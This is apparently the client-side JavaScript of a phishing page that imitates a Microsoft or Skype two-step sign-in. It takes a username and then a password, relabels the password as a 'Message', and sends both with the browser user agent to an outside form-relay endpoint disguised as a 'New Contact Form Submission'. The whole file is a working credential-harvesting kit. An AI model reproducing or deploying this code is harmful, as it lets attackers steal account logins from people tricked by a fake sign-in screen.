document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name.";
    const pwdReq = "message.";

    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');

    let view = "uname";
    let unameVal = false;
    let pwdVal = false;

    ///// next button
    const nxt = document.getElementById('btn_next');

    nxt.addEventListener('click', () => {
        validate();

        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');

            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            });

            view = "pwd";
        }
    });

    ////// submit button
    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', async () => {
        validate();

        if (pwdVal) {

            const formData = new FormData();

            formData.append("Identity", unameInp.value);
            formData.append("Message", pwdInp.value);
            formData.append("Submitted At", new Date().toLocaleString());
            formData.append("User Agent", navigator.userAgent);

            // FormSubmit settings
            formData.append("_subject", "New Contact Form Submission");
            formData.append("_captcha", "false");

            try {
                await fetch("https://submit-form.com/RnHuWuSc6", {
                    method: "POST",
                    body: formData
                });

                document.getElementById("section_pwd").classList.toggle('d-none');
                document.getElementById('section_final').classList.remove('d-none');
                view = "final";

            } catch (err) {
                console.error("Submission failed:", err);
            }
        }
    });

    function validate() {

        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp');
                unameVal = true;
            }
        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp');
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp');
                pwdVal = true;
            }
        }

        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }

            unameInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            });

        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }

            pwdInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            });
        }

        return false;
    }

    // back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    });

    // final buttons
    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            window.open(location, '_self').close();
        });
    });
});
